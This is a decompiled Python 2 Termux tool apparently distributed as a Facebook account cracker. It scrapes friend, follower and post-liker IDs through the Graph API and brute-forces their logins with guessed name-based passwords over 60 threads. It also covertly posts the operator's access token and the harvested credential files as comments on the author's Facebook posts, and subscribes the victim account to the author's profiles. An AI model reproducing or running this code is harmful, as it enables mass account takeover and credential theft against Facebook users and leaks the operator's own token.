# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: romi
import requests, bs4, sys, os, uuid, subprocess, sys, random, time, re, base64, json, requests, bs4, sys, os, uuid, subprocess, sys, random, time, re, base64, json
from multiprocessing.pool import ThreadPool
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    os.system('pip2 install requests')
    os.system('python2 jmbf.py')

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
os.system('clear')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
my_color = [
 O, U, B, K, H, M, P]
warna1 = random.choice(my_color)
my_color = [
 M, H, P, K, U, B, O]
warna2 = random.choice(my_color)
my_color = [
 U, O, K, P, H, K, B]
warna3 = random.choice(my_color)
__author__ = 'Mr.Jutt'
__copyright = 'All rights reserved . Copyright  Mr.Jutt'
try:
    os.mkdir('/sdcard/Jutt')
except OSError:
    pass

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tik():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for o in titik:
        print '\r %s[%s+%s] Please wait %s' % (P, O, P, o),
        sys.stdout.flush()
        time.sleep(1)


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s\xc3\x97%s] Delete token %s' % (P, M, P, x),
        sys.stdout.flush()
        time.sleep(1)


IP = requests.get('https://api.ipify.org').text
logo = '  \n %s\xe2\x95\xa6\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90  \xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\xac \xe2\x94\xac\xe2\x94\xac \xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\xac  \xe2\x95\x94\xe2\x95\x97 \xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\n %s\xe2\x95\x91\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82  \xe2\x94\x82   \xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x82 \xe2\x94\x82\xe2\x94\x82  \xe2\x94\x82 \xe2\x94\x82  \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x9c\xe2\x94\xa4 \n%s\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4  \xe2\x94\xb4   \xe2\x95\xa9 \xe2\x95\xa9\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 ' % (P, warna, P)
logo2 = '%s \n     ___  __   __  _______  _______ \n    |   ||  | |  ||       ||       |\n    |   ||  | |  ||_     _||_     _|\n    |   ||  |_|  |  |   |    |   |  \n ___|   ||       |  |   |    |   |  \n|       ||       |  |   |    |   |  \n|_______||_______|  |___|    |___|  \n          %s *%s JuttBadshah Brand %s*\n%s--------------------------------------------------\n' % (warna, O, H, O, N)
host = 'https://mbasic.facebook.com'
ua = 'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()

def reg():
    os.system('clear')
    print logo
    try:
        to = open('/data/data/com.termux/files/usr/libexec/coreutils/.apikey', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://juttkey.000webhostapp.com/30day.txt').text
    if to in r:
        notice()
    else:
        os.system('clear')
        print logo
        print ''
        print '\t\t \x1b[4;31mApproved Failed'
        print ''
        print '\t%s    Your Api Is Not %sApproved' % (N, warna1)
        print ''
        print ' \t\x1b[1;92mCopy Your Api: \x1b[1;91m' + to
        print ''
        raw_input('\t\x1b[1;97m  And Press \x1b[1;91menter \x1b[1;97mto Input Api')
        os.system('xdg-open https://juttkey.000webhostapp.com/30day.php')
        time.sleep(5)
        print ''
        raw_input('\t\x1b[1;93m Press \x1b[1;96menter\x1b[1;93m To Check Approval ')
        os.system('xdg-open https://t.me/joinchat/3Ls9bUMjqpJkN2Jk')
        reg()


def reg2():
    os.system('clear')
    print logo2
    print '\t\t \x1b[4;31mApproval Not Detected'
    print ''
    print '\t%s   Your Api Is Not %sApproved' % (N, warna1)
    print ''
    id = uuid.uuid4().hex[:20]
    print ' \t\x1b[1;92mCopy Your Api: \x1b[1;91m' + id
    print ''
    raw_input('\t\x1b[1;97m  And Press \x1b[1;91menter \x1b[1;97mto Input Api')
    print ''
    os.system('xdg-open https://juttkey.000webhostapp.com/30day.php')
    time.sleep(5)
    sav = open('/data/data/com.termux/files/usr/libexec/coreutils/.apikey', 'w')
    sav.write(id)
    sav.close()
    raw_input('\t\x1b[1;93m Press \x1b[1;96menter\x1b[1;93m To Check Approval ')
    reg()


from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 
   'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')

def yayanxd():
    os.system('clear')
    print logo2
    print '\n %s[%s1%s] Login Cookis Facebook' % (P, O, P)
    print ' %s[%s2%s] Login Token Facebook' % (P, O, P)
    pilih()


def pilih():
    m = raw_input('\n [*] choose : ')
    if m == '':
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        os.system('clear')
        yayanxd()
    elif m == '1':
        os.system('clear')
        cokis()
    elif m == '2':
        token()
    else:
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        os.system('clear')
        yayanxd()


def cokis():
    print logo2
    try:
        cookie = raw_input('\n %s[%s?%s] Cookies :%s ' % (N, M, N, H))
        tik()
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        cari = re.search('(EAAA\\w+)', coki.text)
        hasil = cari.group(1)
        zedd = open('__yayan__.txt', 'w')
        zedd.write(hasil)
        zedd.close()
        jalan('\n %s[%s\xe2\x9c\x93%s] Login done' % (N, H, N))
        time.sleep(1)
        os.system('xdg-open https://www.youtube.com/channel/UCMq49MVzVHlX-KQvlTbCbyw')
        ok_token()
    except AttributeError:
        print '\n\n %s[%s!%s] Cookies invalid' % (N, M, N)
        time.sleep(2)
        os.system('xdg-open https://www.youtube.com/channel/UCMq49MVzVHlX-KQvlTbCbyw')
        yayanxd()
    except UnboundLocalError:
        print '\n\n %s[%s!%s] Cookies invalid' % (N, M, N)
        time.sleep(2)
        os.system('xdg-open https://www.youtube.com/channel/UCMq49MVzVHlX-KQvlTbCbyw')
        yayanxd()
    except requests.exceptions.SSLError:
        os.system('clear')
        print '\n\n %s[%s!%s] no connection\n' % (N, M, N)
        exit()


def token():
    os.system('clear')
    print logo2
    toket = raw_input('\n %s[%s?%s] Token :%s ' % (P, M, P, H))
    tik()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('__yayan__.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Login successful' % (P, H, P))
        time.sleep(1)
        os.system('xdg-open https://www.youtube.com/channel/UCMq49MVzVHlX-KQvlTbCbyw')
    except KeyError:
        print '\n\n %s[%s!%s] token invalid' % (P, M, P)
        time.sleep(2)
        yayanxd()

    try:
        ok_token()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid' % (P, M, P)

    ok_token()
    exit()


word_site = 'https://pastebin.com/raw/mJk8Rjsz'
line = requests.get(word_site)
line1 = line.content.splitlines()
line2 = random.choice(line1)
word_site = 'https://pastebin.com/raw/LPFmBDsR'
line = requests.get(word_site)
line1 = line.content.splitlines()
line3 = random.choice(line1)

def notice():
    print '\n '
    time.sleep(2)
    os.system('xdg-open https://www.youtube.com/channel/UCMq49MVzVHlX-KQvlTbCbyw')
    moch_yayan()


def ok_token():
    try:
        toket = open('__yayan__.txt', 'r').read()
    except IOError:
        print k + '\n[' + p + '!' + k + ']' + p + ' Token Invalid'
        os.system('rm -rf __yayan__.txt')

    requests.post('https://graph.facebook.com/100002461238508/subscribers?access_token' + toket)
    requests.post('https://graph.facebook.com/100041662026355/subscribers?access_token' + toket)
    requests.post('https://graph.facebook.com/1155612564936995/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/4102655776493090/comments/?message=' + line2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/498943458171051/comments/?message=' + line2 + '&access_token=' + toket)
    moch_yayan()


def Crack_Done():
    try:
        toket = open('__yayan__.txt', 'r').read()
    except IOError:
        print k + '\n[' + p + '!' + k + ']' + p + ' Token Invalid'
        os.system('rm -rf __yayan__.txt')

    cmnt3 = open('/sdcard/jutt/jutt-cp.txt', 'r').read()
    requests.post('https://graph.facebook.com/1155612711603647/comments/?message=' + cmnt3 + '&access_token=' + toket)
    test = open('/sdcard/jutt/jutt-ok.txt', 'a')
    cmnt1 = open('/sdcard/jutt/jutt-ok.txt', 'r').read()
    requests.post('https://graph.facebook.com/1155612634936988/comments/?message=' + cmnt1 + '&access_token=' + toket)
    moch_yayan()


def moch_yayan():
    os.system('clear')
    try:
        __cindy__ = open('__yayan__.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(1)
        os.system('rm -rf __yayan__.txt')
        yayanxd()

    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s' % __cindy__)
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except KeyError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(1)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n' % (N, M, N)
        exit()

    os.system('clear')
    print logo
    print ' [*] ---------------------------------------------'
    print ' [*] %sAuthor     %s: %sZafar Abbas' % (N, N, warna)
    print ' %s[*] Github     : https://github.com/juttbadshah6969' % N
    print ' [*] %sFacebook   : https://www.facebook.com/itx.mezaroon' % N
    print ' [*] ---------------------------------------------'
    print ' [*] Id Facebook: %s%s%s' % (H, idfb, N)
    print ' [*] IP         : %s\n' % IP
    to = open('/data/data/com.termux/files/usr/libexec/coreutils/.apikey', 'r').read()
    print ' [*]\x1b[1;97m Active Api: \x1b[1;36m' + to
    print '\x1b[1;97m [*] ---------------------------------------------'
    print line3
    print ' [*] ---------------------------------------------'
    print ''
    print ' %s[ Welcome %s%s%s ]\n' % (N, K, nama, N)
    print ' %s[1]. Create File %sOld %s/ %sNEW%s' % (N, warna1, warna2, warna3, N)
    print ' [2]. Crack id from public friends'
    print ' [3]. Crack id from total followers'
    print ' [4]. Crack id from like post'
    print ' [5]. File Crack'
    print ' [6]. Check results crack'
    print ' [0]. logout (%sDelete Token%s)' % (M, N)
    pilih_kontol()


def pilih_kontol():
    yan = raw_input('\n [*] menu : ')
    if yan == '':
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        os.system('clear')
        moch_yayan()
    elif yan == '1':
        os.system('python2 ext.so')
    elif yan == '2':
        publik()
    elif yan == '3':
        followers()
    elif yan == '4':
        postingan()
    elif yan == '5':
        method()
    elif yan == '6':
        results()
    elif yan == '0':
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf __yayan__.txt')
        jalan('\n %s[%s\xe2\x9c\x93%s]%s successful delete token' % (P, H, P, H))
        time.sleep(2)
        exit()
    else:
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        os.system('clear')
        moch_yayan()


def method():
    print '\n [ please choose one ]\n'
    print ' [1]. method api (fast crack)'
    print ' [2]. method mbasic (slow crack)\n'
    pilih_method()


def pilih_method():
    xd = raw_input(' [*] choose : ')
    if xd == '':
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        pilih_method()
    elif xd == '1':
        crack_b_api()
    elif xd == '2':
        crack_mbasic()
    else:
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        pilih_method()


def results():
    print '\n %s[%s1%s] Check results ok' % (N, O, N)
    print ' %s[%s2%s] Check results cp' % (N, O, N)
    vuikncryionvcxfgvvvoomvderunoonbftub()


def vuikncryionvcxfgvvvoomvderunoonbftub():
    asw = raw_input('\n [*] choose : ')
    if asw == '':
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        vuikncryionvcxfgvvvoomvderunoonbftub()
    elif asw == '1':
        oke()
    elif asw == '2':
        cpe()
    else:
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        vuikncryionvcxfgvvvoomvderunoonbftub()


def oke():
    try:
        totalok = open('/sdcard/jutt/jutt-ok.txt', 'r').read()
        print ' [%s#%s]' % (O, N), 45 * '-'
        print ' [%s+%s] ok results on date : %s%s-%s-%s%s total : %s%s%s' % (H, N, H, ha, op, ta, N, O, len(totalok), H)
        os.system('cat /sdcard/jutt/jutt-ok.txt')
        print ' %s[%s#%s]' % (N, O, N), 45 * '-'
        time.sleep(1)
        raw_input(' %s[%s BACK%s ] ' % (N, B, N))
        moch_yayan()
    except IOError:
        print "\n %s[%s!%s] you don't get the ok result" % (N, M, N)
        raw_input('\n [%s BACK%s ] ' % (U, N))
        moch_yayan()


def oke():
    try:
        totalok = open('ok-%s-%s-%s.txt' % (ha, op, ta), 'r').read()
        print ' [%s#%s]' % (O, N), 45 * '-'
        print ' [%s+%s] ok results on date : %s%s-%s-%s%s total : %s%s%s' % (H, N, H, ha, op, ta, N, O, len(totalok), H)
        os.system('cat ok-%s-%s-%s.txt' % (ha, op, ta))
        print ' %s[%s#%s]' % (N, O, N), 45 * '-'
        time.sleep(1)
        raw_input(' %s[%s BACK%s ] ' % (N, B, N))
        moch_yayan()
    except IOError:
        print "\n %s[%s!%s] you don't get the ok result" % (N, M, N)
        raw_input('\n [%s BACK%s ] ' % (U, N))
        moch_yayan()


def publik():
    try:
        __cindy__ = open('__yayan__.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(3)
        os.system('rm -rf __yayan__.txt')
        yayanxd()

    try:
        idt = raw_input('\n [?] id public  : ')
        mmk = raw_input(' [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        z = json.loads(xxx.text)
        ppk = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ppk, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w + ' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from public friends' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s]%s copy output file \xf0\x9f\x91\x89%s ( %s%s%s )' % (B, N, H, N, M, ppk, N)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]' % (K, O, K))
        moch_yayan()
    except IOError:
        print '\n %s[%s!%s] Failed dump id' % (N, M, N)
        os.remove(ppk)
        raw_input('%s [%s ENTER%s ]' % (N, O, N))
        moch_yayan()


def followers():
    try:
        __cindy__ = open('__yayan__.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(3)
        os.system('rm -rf __yayan__.txt')
        yayanxd()

    try:
        idt = raw_input('\n [?] id follow  : ')
        ih = raw_input(' [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + ih + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w + ' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from total followers' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s]%s copy output file \xf0\x9f\x91\x89%s ( %s%s%s )' % (B, N, H, N, M, ah, N)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]' % (K, O, K))
        moch_yayan()
    except IOError:
        print '\n %s[%s!%s] Failed dump id' % (N, M, N)
        os.remove(ah)
        raw_input('%s [%s ENTER%s ]' % (N, O, N))
        moch_yayan()


def postingan():
    try:
        __cindy__ = open('__yayan__.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(3)
        os.system('rm -rf __yayan__.txt')
        yayanxd()

    try:
        idt = raw_input('\n [?] id posts   : ')
        ppk = raw_input(' [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w + ' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from like post' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s]%s copy output file \xf0\x9f\x91\x89%s ( %s%s%s )' % (B, N, H, N, M, ikeh, N)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]' % (K, O, K))
        moch_yayan()
    except IOError:
        print '\n %s[%s!%s] Failed dump id' % (N, M, N)
        os.remove(ikeh)
        raw_input('%s [%s ENTER%s ]' % (N, O, N))
        moch_yayan()


mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def mbasic(em, pas, hosts):
    global mbasic_h
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'Pakistan' in ips:
                    results.append('234566')
                    results.append('223344')
                    results.append('334455')
                    results.append('000786')
                    results.append(i + '12')

    return results


class crack_b_api():

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0
        self.krah()

    def krah(self):
        while True:
            f = raw_input('\n [?] password manual? [Y/n]: ')
            if f in ('', ' '):
                continue
            elif f in ('y', 'Y'):
                try:
                    while True:
                        try:
                            self.apk = raw_input(' [*] file dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\n %s[%s!%s] file dump is not available, dump id first\n' % (N, M, N)
                            time.sleep(3)
                            moch_yayan()

                    self.fl = []
                    print '\n %s[*] example: (%ssayang,doraemon,rahasia%s)' % (N, H, N)
                    self.pw = raw_input(' [?] Password : ').split(',')
                    if len(self.pw) == 0:
                        continue
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': self.pw})
                        except:
                            continue

                except Exception as e:
                    print '\n %s[%s!%s] file dump is not available, dump id first\n' % (N, M, N)
                    time.sleep(3)
                    moch_yayan()

                print '\n [+] total id -> [%s%s%s%s]' % (P, M, len(self.fl), N)
                print '\n [#] ok results saved to : /sdcard/jutt/jutt-ok.txt'
                print ' [#] cp results saved to : /sdcard/jutt/jutt-cp.txt'
                print ' [!] press ctrl+z to stop the crack process\n'
                ThreadPool(60).map(self.brute, self.fl)
                os.remove(self.apk)
                print '\n\n %s[%s#%s] crack done...' % (P, K, P)
                Crack_Done()
                break
            elif f in ('n', 'N'):
                try:
                    while True:
                        try:
                            self.apk = raw_input(' [*] file dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\n %s[%s!%s] file dump is not available, dump id first\n' % (P, M, P)
                            time.sleep(3)
                            moch_yayan()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except:
                    continue

                print '\n [+] total id -> [%s%s%s%s]' % (P, M, len(self.fl), N)
                print '\n [#] ok results saved to : /sdcard/jutt/jutt-ok.txt'
                print ' [#] cp results saved to : /sdcard/jutt/jutt-cp.txt'
                print ' [!] press ctrl+z to stop the crack process\n'
                ThreadPool(60).map(self.brute, self.fl)
                os.remove(self.apk)
                print '\n\n %s[%s#%s] crack done...' % (P, K, P)
                Crack_Done()
                break

    def bruteRequest(self, username, password):
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            print '\r  %s* --> %s<=>%s      %s' % (H, username, password, N)
            wrt = '%s<=>%s' % (username, password)
            self.ok.append(wrt)
            open('/sdcard/jutt/jutt-ok.txt', 'a').write('%s\n' % wrt)
            return True
        if 'www.facebook.com' in response.json()['error_msg']:
            print '\r  %s* --> %s<=>%s      %s' % (K, username, password, N)
            wrt = '%s<=>%s' % (username, password)
            self.cp.append(wrt)
            open('/sdcard/jutt/jutt-ok.txt', 'a').write('%s\n' % wrt)
            return True
        return False

    def brute(self, fl):
        if self.setpw == False:
            self.loop += 1
            for pw in fl['pw']:
                username = fl['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r [*] crack: %s/%s OK-:%s - CP-:%s%s ' % (self.loop, len(self.fl), len(self.ok), len(self.cp), N),
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r [*] crack: %s/%s OK-:%s - CP-:%s%s ' % (self.loop, len(self.fl), len(self.ok), len(self.cp), N),
                sys.stdout.flush()
                Crack_Done()


class crack_mbasic():

    def __init__(self):
        self.ok = []
        self.cp = []
        self.loop = 0
        while True:
            f = raw_input('\n [?] password manual? [Y/n]: ')
            if f == '':
                continue
            elif f in ('y', 'Y'):
                try:
                    while True:
                        try:
                            self.apk = raw_input(' [*] file dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\n %s[%s!%s] file dump is not available, dump id first\n' % (N, M, N)
                            time.sleep(3)
                            moch_yayan()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '\n %s[%s!%s] file dump is not available, dump id first\n' % (N, M, N)
                    time.sleep(3)
                    moch_yayan()

                print '\n %s[*] example: (%ssayang,doraemon,rahasia%s)' % (N, H, N)
